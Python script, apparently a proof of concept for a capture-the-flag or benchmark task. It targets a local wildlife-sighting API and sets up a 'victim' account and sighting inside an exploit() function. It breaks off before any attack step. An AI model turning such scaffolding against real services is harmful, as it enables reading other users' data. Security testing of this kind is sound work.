import requests
import sys
import random
import string

BASE_URL = "http://127.0.0.1:8000"

def random_username():
    return ''.join(random.choices(string.ascii_lowercase, k=8))

def random_password():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12))

def signup(session, username, password):
    r = session.post(f"{BASE_URL}/signup", params={"username": username, "password": password})
    return r.json().get("token")

def login(session, username, password):
    r = session.post(f"{BASE_URL}/login", params={"username": username, "password": password})
    return r.json().get("token")

def create_sighting(session, token, species, lat, lng, date_str):
    r = session.post(
        f"{BASE_URL}/sightings",
        params={"species": species, "latitude": lat, "longitude": lng, "date_str": date_str},
        headers={"Authorization": f"Bearer {token}"}
    )
    return r.json()

def get_sighting(session, token, sighting_id):
    r = session.get(
        f"{BASE_URL}/sightings/{sighting_id}",
        headers={"Authorization": f"Bearer {token}"}
    )
    if r.status_code == 200:
        return r.json()
    return None

def get_recent_sightings(session, token):
    r = session.get(
        f"{BASE_URL}/sightings",
        headers={"Authorization": f"Bearer {token}"}
    )
    if r.status_code == 200:
        return r.json()
    return None

def exploit():
    session = requests.Session()

    # Create victim user and sighting
    victim_user = random_username()
    victim_pass = random_password()
    victim_token = signup(session, victim_user, victim_pass)

    # Create a sighting as victim
